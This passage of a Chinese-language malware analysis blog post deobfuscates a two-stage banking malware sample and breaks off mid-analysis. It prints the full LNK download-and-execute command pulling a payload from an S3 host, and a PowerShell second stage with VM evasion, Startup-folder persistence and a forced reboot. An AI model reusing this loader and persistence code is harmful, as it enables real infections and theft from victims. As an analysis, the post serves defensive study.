**在本文中，将分析一款银行恶意软件，分为两个阶段。第一阶段是Windows快捷方式文件（LNK文件），第二阶段为Powershell脚本（已被[ISESteriods](https://www.powertheshell.com/obfuscationmode/)混淆）。**  

其中的样本包括所有删除的文件，都可以[在此处](https://beta.virusbay.io/sample/browse/907dbc3048f75bb577ff9c064f860fc5)下载。哈希值如下，感兴趣的小伙伴可以下载下来玩下!

    
    
    MD5：907dbc3048f75bb577ff9c064f860fc5  
    SHA-1：667b8fa87c31f7afa9a7b32c3d88f365a2eeab9c  
    SHA-256：78a14c6663bd9235b014b6d7b7ce19487f163317fdd36bb111d8797d7a7f1724

## 阶段1 –LNK

快捷方式一般目的是调用cmd.exe去执行命令,比如如下面示例。

    
    
    C:\Windows\system32\cmd.exe /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&&set L1U03HmUO6B9IcurCNNlo4=.com&& echo | start %x4OAGWfxlES02z6NnUkK:~2,4%s://get.adobe%L1U03HmUO6B9IcurCNNlo4%/br/flashplayer/

### 参数

参数/ V和/ C一般结合使用。然后使用/？标志来显示帮助信息。下面是执行此操作的完整命令。

    
    
    cmd.exe /?

请注意，多个命令由命令分隔符“&&”分隔。

### 变量

变量在百分号之间拆分，并使用两个“＆”号将多个命令连接在一起。关键字set用于声明变量并为其设置值。下面，对命令进行了拆分，以便每个命令都在新行上。

    
    
    set x4OAGWfxlES02z6NnUkK=2whttpr0  
    &&  
    set L1U03HmUO6B9IcurCNNlo4=.com  
    &&   
    echo | start %x4OAGWfxlES02z6NnUkK:~2,4%s://get.adobe%L1U03HmUO6B9IcurCNNlo4%/br/flashplayer/

前两个变量（x4OAGWfxlES02z6NnUkK和L1U03HmUO6B9IcurCNNlo4）用于在最后一行进行拼接，最终的url如下所示

    
    
    https://get.adobe.com/br/flashplayer/

调用默认的浏览器打开Adobe Flash Player官方网站。

### 完整的快捷方式

十六进制编辑器的结果如下。

    
    
    C:\Windows\system32\cmd.exe /V /C set x4OAGWfxlES02z6NnUkK=2whttpr0&&set L1U03HmUO6B9IcurCNNlo4=.com&& echo | start %x4OAGWfxlES02z6NnUkK:~2,4%s://get.adobe%L1U03HmUO6B9IcurCNNlo4%/br/flashplayer/                                                                                                                      &&set aZM4j3ZhPLBn9MpuxaO= -win 1 &&set MlyavWfE=ndows&&set jA8Axao1xcZ=iEx&&set WMkgA3uXa1pXx=tRi&&set KNhGmAqHG5=bJe&&set 4kxhaz6bqqKC=LOad&&set rwZCnSC7T=nop&&set jcCvC=NEw&&set ZTVZ=wEbc&&set DABThzRuTT2hYjVOy=nt).dow&&set cwdOsPOdA08SZaXVp1eFR=t NeT.&&set Rb=Ers&&set j4HfRAqYXcRZ3R=hEll&&set Kpl01SsXY5tthb1=.bmp&&set vh7q6Aq0zZVLclPm=\v1.0\&&set 2Mh=pOw&&set 8riacao=%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%&&@echo off && %SystemDrive% && cd\ && cd %SystemRoot%\System32 &&echo %jA8Axao1xcZ%("%jA8Axao1xcZ%(!jcCvC!-o%KNhGmAqHG5%c!cwdOsPOdA08SZaXVp1eFR!!ZTVZ!Lie!DABThzRuTT2hYjVOy!n%4kxhaz6bqqKC%S%WMkgA3uXa1pXx%NG('%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%')"); | Wi!MlyavWfE!!2Mh!!Rb!!j4HfRAqYXcRZ3R!!vh7q6Aq0zZVLclPm!!2Mh!!Rb!!j4HfRAqYXcRZ3R! -!rwZCnSC7T!!aZM4j3ZhPLBn9MpuxaO! --%ProgramFiles%\Internet Explorer\iexplore.exe  
    ​

当所有命令都在一行中时，上面的命令很难阅读。我们来重新调一下

    
    
    x4OAGWfxlES02z6NnUkK=2whttpr0  
    L1U03HmUO6B9IcurCNNlo4=.com  
    %x4OAGWfxlES02z6NnUkK:~2,4%s://get.adobe%L1U03HmUO6B9IcurCNNlo4%/br/flashplayer/   
    aZM4j3ZhPLBn9MpuxaO= -win 1  
    MlyavWfE=ndows  
    jA8Axao1xcZ=iEx  
    WMkgA3uXa1pXx=tRi  
    KNhGmAqHG5=bJe  
    4kxhaz6bqqKC=LOad  
    rwZCnSC7T=nop  
    jcCvC=NEw  
    ZTVZ=wEbc  
    DABThzRuTT2hYjVOy=nt).dow  
    cwdOsPOdA08SZaXVp1eFR=t NeT.  
    Rb=Ers  
    j4HfRAqYXcRZ3R=hEll  
    Kpl01SsXY5tthb1=.bmp  
    vh7q6Aq0zZVLclPm=\v1.0\  
    2Mh=pOw  
    8riacao=%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%  
    @echo off   
    %SystemDrive%  
    cd\  
    cd %SystemRoot%\System32  
    echo %jA8Axao1xcZ%("%jA8Axao1xcZ%(!jcCvC!-o%KNhGmAqHG5%c!cwdOsPOdA08SZaXVp1eFR!!ZTVZ!Lie!DABThzRuTT2hYjVOy!n%4kxhaz6bqqKC%S%WMkgA3uXa1pXx%NG('%x4OAGWfxlES02z6NnUkK:~2,4%s://s3-eu-west-1.amazonaws%L1U03HmUO6B9IcurCNNlo4%/juremasobra2/jureklarj934t9oi4%Kpl01SsXY5tthb1%')"); | Wi!MlyavWfE!!2Mh!!Rb!!j4HfRAqYXcRZ3R!!vh7q6Aq0zZVLclPm!!2Mh!!Rb!!j4HfRAqYXcRZ3R! -!rwZCnSC7T!!aZM4j3ZhPLBn9MpuxaO! --%ProgramFiles%\Internet Explorer\iexplore.exe

将上面的命令提取一下，大概命令如下。

    
    
    echo iEx(iEx(NEw-obJect NeT.wEbcLient).downLOadStRiNG('https://s3-eu-west-1.amazonaws.com/juremasobra2/jureklarj934t9oi4.bmp')"); | WindowspOwErshEll\v1.0\pOwErshEll -nop -win 1 --%ProgramFiles%\Internet Explorer\iexplore.exe
    

根据[Microsoft文档中](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-6)的提示，iex代表Invoke-Expression，也就是执行的意思，这串代码的意思就是从Amazon
AWS服务器下载位图（.BMP），然后使用Powershell打开它。参数`-nop`。不使用任何配置文件，其次，参数`-win
1`,值`1`代表隐藏窗口。

## 第二阶段– ISES

我们提取出bmp图片里面的Powershell脚本。完整的脚本如下。

    
    
    ${____/===\/=====\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHMAMwAtAGUAdQAtAHcAZQBzAHQALQAxA**AYQBtAGEAegBvAG4AYQB3AHMALgBjAG8AbQAvAGoAdQByAGUAbQBhAHMAbwBiAHIAYQAyAC8AaQBtAGEAZwBlADIALgBwAG4AZwA===')))
    _.dll = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwAuAGQAbABsAA==')))
    _.prx = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwAuAHAAcgB4AA==')))
    MaxNotify   = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgATgBvAHQAaQBmAHkA')))
     
    function _/=\/\/===\/==\___
    {
      ${_/\___/=\_/\/\__/} = gwmi -Class Win32_ComputerSystem |select -ExpandProperty Model
      if (${_/\___/=\_/\/\__/} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABCAG8AeAA='))) -or
        ${_/\___/=\_/\/\__/} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBNAHcAYQByAGUAIABWAGkAcgB0AHUAYQBsACAAUABsAGEAdABmAG8AcgBtAA=='))) -or
        ${_/\___/=\_/\/\__/} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbAAgAE0AYQBjAGgAaQBuAGUA'))) -or
      ${_/\___/=\_/\/\__/} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABWAE0AIABkAG8AbQBVAA=='))))
      {
        return "Y"
      }
      else
      { 
        return "N"
      }
    }
    function ____/\__/===\_/=\/
    {
      try
      {
        ${___/\_/=\_/=\_/\/} = Get-Random -Minimum 1 -Maximum 9
        ${_/\/\_/\/\_/=\/\/} = ""
        For (${/==\/\___/\_/\/==}=0; ${/==\/\___/\_/\/==} -le ${___/\_/=\_/=\_/\/}; ${/==\/\___/\_/\/==}++) 
        {
          qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cQB3AGUAcgB0AHkAdQBpAG8AcABsAGsAagBoAGcAZgBkAHMAYQB6AHgAYwB2AGIAbgBtAFE**wBFAFI**ABZAFUASQBPAFAAQQBTAEQARgBHAEgASgBLAEwAWgBYAEM**gBCAE4ATQA=')))
          nomeRandomico_getrandom  = Get-Random -Minimum 1 -Maximum qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM.Length
          caractereRandomico = qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM.Substring(nomeRandomico_getrandom,1)
          ${_/\/\_/\/\_/=\/\/} = ${_/\/\_/\/\_/=\/\/}+caractereRandomico   
        }
        return ${_/\/\_/\/\_/=\/\/} 
      }
      finally{}
    }
    function __/====\___/=\_/\_(${___/\/\_/\_/=\__/\}, ${___/==\/=\/=\____/})
    { 
        ${/=\_/\/====\/\_/\} = New-Object $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBVAHIAaQA='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAC8AXAAvAFwAXwAvAFwAXwAvAD0AXABfAF8ALwBcAH0A'))) 
        ${/=\/===\_/\/\_/\_} = [System.Net.HttpWebRequest]::Create(${/=\_/\/====\/\_/\}) 
        ${/=\/===\_/\/\_/\_}.set_Timeout(15000) 
        ${/=\/====\__/==\__} = ${/=\/===\_/\/\_/\_}.GetResponse() 
        ${/=\_/==\__/\__/\_} = [System.Math]::Floor(${/=\/====\__/==\__}.get_ContentLength()/1024) 
        ${_/===\/=\_/=\___/} = ${/=\/====\__/==\__}.GetResponseStream() 
        ${__/====\__/\/\__/} = New-Object -TypeName System.IO.FileStream -ArgumentList ${___/==\/=\/=\____/}, Create 
        ${/=\/=\/==\_/\/=\_} = new-object byte[] 10KB 
        ${_/===\_/=\/\/===\} = ${_/===\/=\_/=\___/}.Read(${/=\/=\/==\_/\/=\_},0,${/=\/=\/==\_/\/=\_}.length) 
        ${/==\_/===\/\/=\/\} = ${_/===\_/=\/\/===\} 
        while (${_/===\_/=\/\/===\} -gt 0) 
        { 
            ${__/====\__/\/\__/}.Write(${/=\/=\/==\_/\/=\_}, 0, ${_/===\_/=\/\/===\}) 
            ${_/===\_/=\/\/===\} = ${_/===\/=\_/=\___/}.Read(${/=\/=\/==\_/\/=\_},0,${/=\/=\/==\_/\/=\_}.length) 
            ${/==\_/===\/\/=\/\} = ${/==\_/===\/\/=\/\} + ${_/===\_/=\/\/===\} 
        } 
        ${__/====\__/\/\__/}.Flush()
        ${__/====\__/\/\__/}.Close() 
        ${__/====\__/\/\__/}.Dispose() 
        ${_/===\/=\_/=\___/}.Dispose() 
        return "Y"
    } 
    function _____/==\_/=\_/===
    {
      Param([string]${_/=====\/==\/\___/},[string]${___/\____/\_/=\/\_});
      try{  
        ${_/\/=\/\/===\/\/\} = New-Object -ComObject WScript.Shell 
        ${/=\/=\/\/=\_/=\__} = ${_/\/=\/\/===\/\/\}.CreateShortcut(${_/=====\/==\/\___/}) 
        ${/=\/=\/\/=\_/=\__}.TargetPath = 'powershell'
        ${/=\/=\/\/=\_/=\__}.Arguments = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwBfAC8AXABfAF8AXwBfAC8AXABfAC8APQBcAC8AXABfAH0A')))
        ${/=\/=\/\/=\_/=\__}.WorkingDirectory = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBTAHkAcwB0AGUAbQBSAG8AbwB0ACUAXABTAHkAcwB0AGUAbQAzADIA'))) 
        ${/=\/=\/\/=\_/=\__}.WindowStyle = 7   
        ${/=\/=\/\/=\_/=\__}.IconLocation = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwAlAFwASQBuAHQAZQByAG4AZQB0ACAARQB4AHAAbABvAHIAZQByAFwAaQBlAHgAcABsAG8AcgBlA**AZQB4AGUALAAxAA==')))
        ${/=\/=\/\/=\_/=\__}.Save()
      }finally{}
    }
    function _/=\/\_/\/===\_/==
    {
      try
      {
        ${_/======\_/\/=\/\} = New-Object System.Threading.Mutex($false, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA0ADQANAA0ADQANAA0ADQANAA0ADQA'))))
        return ${_/======\_/\/=\/\}.WaitOne()  
      }finally{}
    }
      if (_/=\/\/===\/==\___ -eq "N")
      {
      if (_/=\/\_/\/===\_/==)  {
         stop-process -name wmplayer 
        ${___/\/===\____/\/} = ${env:APPDATA}+"\"
        ${/=\______/=\/==\/} = ____/\__/===\_/=\/
        ${/===\/=\/\_/=\/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB0AHgAdAA=')))
        ${_/=\/===\/\___/\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB2AGIAcwA=')))
        ${/=\/==\__/\_/\__/}  = ${___/\/===\____/\/}+${/=\______/=\/==\/}+${/===\/=\/\_/=\/==}
        ${/=\__/=\___/===\_}  = ${___/\/===\____/\/}+${/=\______/=\/==\/}+${_/=\/===\/\___/\_} 
        sleep -s 1
            ${/===\/\_/====\/=\}  = $false
            while(${/===\/\_/====\/=\} -ne $true)
            {
            __/====\___/=\_/\_ ${____/===\/=====\/} ${/=\/==\__/\_/\__/}; sleep -s 1 
            if ((gi ${/=\/==\__/\_/\__/}).length -gt 2048kb)
             {
               ${/===\/\_/====\/=\}  = $true                                                          
               ${_/=\_/==\/=\__/\_} =  "Y" 
              } 
              else 
               {                     
                ${_/=\_/==\/=\__/\_} = "N"
               }
            Write-Host ${/===\/\_/====\/=\}
            }  
           ${_/=\_/==\/=\__/\_} =  "Y" 
            if (${_/=\_/==\/=\__/\_} -eq "Y")
              {
              ${/===\__/\/==\_/==} = ${___/\/===\____/\/}+${/=\______/=\/==\/} +$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB6AGkAcAA=')))
               ren -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQBcAC8APQA9AFwAXwBfAC8AXABfAC8AXABfAF8ALwB9AA=='))) -NewName $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AC8APQA9AD0AXABfAF8ALwBcAC8APQA9AFwAXwAvAD0APQB9AA==')));
              ${/=\_/=\_/===\___/} = New-Object -ComObject shell.application
              ${_/\___/\_/======\} = ${/=\_/=\_/===\___/}.NameSpace(${/===\__/\/==\_/==})               
                foreach (${_/====\/\_/\/\__/} in ${_/\___/\_/======\}.items()) 
                 {
                    ${/=\_/=\_/===\___/}.Namespace(${___/\/===\____/\/}).CopyHere(${_/====\/\_/\/\__/})
                 }
              sleep -s 3 
              ${_/\_/=\_/=\_/\___} = ____/\__/===\_/=\/
              ${/=\_/===\/\_/===\} = ${_/\_/=\_/=\_/\___} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAHIAeAA='))) 
              ${_/\_/=\_/=\_/\___} = ${_/\_/=\_/=\_/\___} +$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBkAGwAbAA='))) 
              ren -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXAAkAHsAXwAvAFwALwBcAF8ALwBcAF8ALwA9AFwALwA9AD0APQA9AH0A'))) -NewName $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXAAkAHsAXwAvAFwAXwAvAD0AXABfAC8APQBcAF8ALwBcAF8AXwBfAH0A'))); 
              ren -Path $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXAAkAHsAXwAvAFwAXwBfAF8AXwAvAD0AXAAvAFwAXwAvAD0APQA9AH0A'))) -NewName $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXAAkAHsALwA9AFwAXwAvAD0APQA9AFwALwBcAF8ALwA9AD0APQBcAH0A')));  
              sleep -s 3 
              cd $env:APPDATA ; 
              shellObjeto = New-Object -Com WScript.Shell
              ${_/=\/\/\/=\__/\/=} = shellObjeto.SpecialFolders.Item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGEAcgB0AHUAcAA='))));          
              del ${_/=\/\/\/=\__/\/=}\*.vbs
              del ${_/=\/\/\/=\__/\/=}\*.lnk
              ${/=\______/\_/\_/=} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBkACAAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAByAHUAbgBkAGwAbAAzADIALgBlAHgAZQAgACQAewBfAC8AXABfAC8APQBcAF8ALwA9AFwAXwAvAFwAXwBfAF8AfQAsACAAJAB7AF8AXwBfAC8APQBcAC8AXAAvAFwAXwBfAF8AXwBfAC8APQB9AA==')))
              ${___/=\/==\/\_____} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8ALwA9AFwALwBcAC8AXAAvAD0AXABfAF8ALwBcAC8APQB9AFwAJAB7AC8APQBcAF8ALwA9AD0APQBcAC8AXABfAC8APQA9AD0AXAB9A**AbABuAGsA')))          
              _____/==\_/=\_/=== ${___/=\/==\/\_____}  ${/=\______/\_/\_/=}
              sleep -s 40
    Restart-Computer -Force
            }
        }
      }
    

代码中各种花里胡巧的混淆。函数和变量名什么的都被混淆了，代码中的字符串也使用base64编码方案进行了编码。

这样肯定是读不了的，要想办法还原回去，下面给出了替换字符串的代码。

    
    
    ${____/===\/=====\/} = $('https://s3-eu-west-1.amazonaws.com/juremasobra2/image2.png')
    _.dll = $('_.dll')
    _.prx = $('_.prx')
    MaxNotify   = $('MaxNotify')
     
    function _/=\/\/===\/==\___
    {
      ${_/\___/=\_/\/\__/} = gwmi -Class Win32_ComputerSystem |select -ExpandProperty Model
      if (${_/\___/=\_/\/\__/} -eq $('VirtualBox') -or
        ${_/\___/=\_/\/\__/} -eq $('VMware Virtual Platform') -or
        ${_/\___/=\_/\/\__/} -eq $('Virtual Machine') -or
      ${_/\___/=\_/\/\__/} -eq $('HVM domU')
      {
        return "Y"
      }
      else
      { 
        return "N"
      }
    }
    function ____/\__/===\_/=\/
    {
      try
      {
        ${___/\_/=\_/=\_/\/} = Get-Random -Minimum 1 -Maximum 9
        ${_/\/\_/\/\_/=\/\/} = ""
        For (${/==\/\___/\_/\/==}=0; ${/==\/\___/\_/\/==} -le ${___/\_/=\_/=\_/\/}; ${/==\/\___/\_/\/==}++) 
        {
          qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM  = $('qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')
          nomeRandomico_getrandom  = Get-Random -Minimum 1 -Maximum qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM.Length
          caractereRandomico = qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM.Substring(nomeRandomico_getrandom,1)
          ${_/\/\_/\/\_/=\/\/} = ${_/\/\_/\/\_/=\/\/}+caractereRandomico   
        }
        return ${_/\/\_/\/\_/=\/\/} 
      }
      finally{}
    }
    function __/====\___/=\_/\_(${___/\/\_/\_/=\__/\}, ${___/==\/=\/=\____/})
    {
        ${/=\_/\/====\/\_/\} = New-Object $('System.uri') $ExecutionContext.InvokeCommand.ExpandString($S{___/\/\_/\_/=\__/\}) 
        ${/=\/===\_/\/\_/\_} = [System.Net.HttpWebRequest]::Create(${/=\_/\/====\/\_/\}) 
        ${/=\/===\_/\/\_/\_}.set_Timeout(15000) 
        ${/=\/====\__/==\__} = ${/=\/===\_/\/\_/\_}.GetResponse() 
        ${/=\_/==\__/\__/\_} = [System.Math]::Floor(${/=\/====\__/==\__}.get_ContentLength()/1024) 
        ${_/===\/=\_/=\___/} = ${/=\/====\__/==\__}.GetResponseStream() 
        ${__/====\__/\/\__/} = New-Object -TypeName System.IO.FileStream -ArgumentList ${___/==\/=\/=\____/}, Create 
        ${/=\/=\/==\_/\/=\_} = new-object byte[] 10KB 
        ${_/===\_/=\/\/===\} = ${_/===\/=\_/=\___/}.Read(${/=\/=\/==\_/\/=\_},0,${/=\/=\/==\_/\/=\_}.length) 
        ${/==\_/===\/\/=\/\} = ${_/===\_/=\/\/===\} 
        while (${_/===\_/=\/\/===\} -gt 0) 
        { 
            ${__/====\__/\/\__/}.Write(${/=\/=\/==\_/\/=\_}, 0, ${_/===\_/=\/\/===\}) 
            ${_/===\_/=\/\/===\} = ${_/===\/=\_/=\___/}.Read(${/=\/=\/==\_/\/=\_},0,${/=\/=\/==\_/\/=\_}.length) 
            ${/==\_/===\/\/=\/\} = ${/==\_/===\/\/=\/\} + ${_/===\_/=\/\/===\} 
        } 
        ${__/====\__/\/\__/}.Flush()
        ${__/====\__/\/\__/}.Close() 
        ${__/====\__/\/\__/}.Dispose() 
        ${_/===\/=\_/=\___/}.Dispose() 
        return "Y"
    } 
    function _____/==\_/=\_/===
    {
      Param([string]${_/=====\/==\/\___/},[string]${___/\____/\_/=\/\_});
      try{  
        ${_/\/=\/\/===\/\/\} = New-Object -ComObject WScript.Shell 
        ${/=\/=\/\/=\_/=\__} = ${_/\/=\/\/===\/\/\}.CreateShortcut(${_/=====\/==\/\___/}) 
        ${/=\/=\/\/=\_/=\__}.TargetPath = 'powershell'
        ${/=\/=\/\/=\_/=\__}.Arguments = $ExecutionContext.InvokeCommand.ExpandString('$S{___/\/\_/\_/=\__/\}')
        ${/=\/=\/\/=\_/=\__}.WorkingDirectory = $('%SystemRoot%\System32')
        ${/=\/=\/\/=\_/=\__}.WindowStyle = 7   
        ${/=\/=\/\/=\_/=\__}.IconLocation = $('%ProgramFiles%\Internet Explorer\iexplore.exe,1')
        ${/=\/=\/\/=\_/=\__}.Save()
      }finally{}
    }
    function _/=\/\_/\/===\_/==
    {
      try
      {
        ${_/======\_/\/=\/\} = New-Object System.Threading.Mutex($false, $('444444444444'))
        return ${_/======\_/\/=\/\}.WaitOne()  
      }finally{}
    }
      if (_/=\/\/===\/==\___ -eq "N")
      {
      if (_/=\/\_/\/===\_/==)  {
         stop-process -name wmplayer 
        ${___/\/===\____/\/} = ${env:APPDATA}+"\"
        ${/=\______/=\/==\/} = ____/\__/===\_/=\/
        ${/===\/=\/\_/=\/==} = $('.txt')
        ${_/=\/===\/\___/\_} = $('.vbs')
        ${/=\/==\__/\_/\__/}  = ${___/\/===\____/\/}+${/=\______/=\/==\/}+${/===\/=\/\_/=\/==}
        ${/=\__/=\___/===\_}  = ${___/\/===\____/\/}+${/=\______/=\/==\/}+${_/=\/===\/\___/\_} 
        sleep -s 1
            ${/===\/\_/====\/=\}  = $false
            while(${/===\/\_/====\/=\} -ne $true)
            {
            __/====\___/=\_/\_ ${____/===\/=====\/} ${/=\/==\__/\_/\__/}; sleep -s 1 
            if ((gi ${/=\/==\__/\_/\__/}).length -gt 2048kb)
             {
               ${/===\/\_/====\/=\}  = $true                                                          
               ${_/=\_/==\/=\__/\_} =  "Y" 
              } 
              else 
               {                     
                ${_/=\_/==\/=\__/\_} = "N"
               }
            Write-Host ${/===\/\_/====\/=\}
            }  
           ${_/=\_/==\/=\__/\_} =  "Y" 
            if (${_/=\_/==\/=\__/\_} -eq "Y")
              {
              ${/===\__/\/==\_/==} = ${___/\/===\____/\/}+${/=\______/=\/==\/} +$('.zip')
               ren -Path $ExecutionContext.InvokeCommand.ExpandString('${/=\/==\__/\_/\__/}') -NewName $ExecutionContext.InvokeCommand.ExpandString('${/===\__/\/==\_/==}');
              ${/=\_/=\_/===\___/} = New-Object -ComObject shell.application
              ${_/\___/\_/======\} = ${/=\_/=\_/===\___/}.NameSpace(${/===\__/\/==\_/==})               
                foreach (${_/====\/\_/\/\__/} in ${_/\___/\_/======\}.items()) 
                 {
                    ${/=\_/=\_/===\___/}.Namespace(${___/\/===\____/\/}).CopyHere(${_/====\/\_/\/\__/})
                 }
              sleep -s 3 
              ${_/\_/=\_/=\_/\___} = ____/\__/===\_/=\/
              ${/=\_/===\/\_/===\} = ${_/\_/=\_/=\_/\___} + ('.prx')
              ${_/\_/=\_/=\_/\___} = ${_/\_/=\_/=\_/\___} + ('.dll')
              ren -Path $ExecutionContext.InvokeCommand.ExpandString('$env:APPDATA\${_/\/\_/\_/=\/====}') -NewName $ExecutionContext.InvokeCommand.ExpandString('$env:APPDATA\${_/\_/=\_/=\_/\___}');
              ren -Path $ExecutionContext.InvokeCommand.ExpandString('$env:APPDATA\${_/\____/=\/\_/===}') -NewName $ExecutionContext.InvokeCommand.ExpandString('$env:APPDATA\${/=\_/===\/\_/===\}');
              sleep -s 3 
              cd $env:APPDATA ; 
              shellObjeto = New-Object -Com WScript.Shell
              ${_/=\/\/\/=\__/\/=} = shellObjeto.SpecialFolders.Item($('startup');
              del ${_/=\/\/\/=\__/\/=}\*.vbs
              del ${_/=\/\/\/=\__/\/=}\*.lnk
              ${/=\______/\_/\_/=} = $ExecutionContext.InvokeCommand.ExpandString('cd $env:APPDATA; Start-Process rundll32.exe ${_/\_/=\_/=\_/\___}, ${___/=\/\/\_____/=}')
              ${___/=\/==\/\_____} = $ExecutionContext.InvokeCommand.ExpandString('${_/=\/\/\/=\__/\/=}\${/=\_/===\/\_/===\}.lnk')
              _____/==\_/=\_/=== ${___/=\/==\/\_____}  ${/=\______/\_/\_/=}
              sleep -s 40
    Restart-Computer -Force
            }
        }
      }
    

这样我们就可以慢慢分析上面的代码了，下面我将其中部分重要代码拿出来分析,并用通俗的方法展示出来。

###

在下面给出的代码中，命名了多个虚拟系统。

    
    
    function _/=\/\/===\/==\___
    {
      ${_/\___/=\_/\/\__/} = gwmi -Class Win32_ComputerSystem |select -ExpandProperty Model
      if (${_/\___/=\_/\/\__/} -eq $('VirtualBox') -or
        ${_/\___/=\_/\/\__/} -eq $('VMware Virtual Platform') -or
        ${_/\___/=\_/\/\__/} -eq $('Virtual Machine') -or
      ${_/\___/=\_/\/\__/} -eq $('HVM domU')
      {
        return "Y"
      }
      else
      { 
        return "N"
      }
    }
    

我们可以看到，变量`_ / \ ___ / = \ _ / \ / \ __
/`包含有关当前系统的信息。因此可以将其重命名为`computerSystem`。同样的`_ / = \ / \ / === \ / == \
___`是检查当前环境是否为虚拟环境，因此可以将其重命名为`vmCheck`。重构代码如下。

    
    
    function vmCheck
    {
      ${computerSystem} = gwmi -Class Win32_ComputerSystem |select -ExpandProperty Model
      if (${computerSystem} -eq $('VirtualBox') -or
        ${computerSystem} -eq $('VMware Virtual Platform') -or
        ${computerSystem} -eq $('Virtual Machine') -or
      ${computerSystem} -eq $('HVM domU')
      {
        return "Y"
      }
      else
      { 
        return "N"
      }
    }
    

下面的函数看起来像一个随机字符串生成器，因为有一个字符串包含一个通用的键盘布局。

    
    
    function ____/\__/===\_/=\/
    {
      try
      {
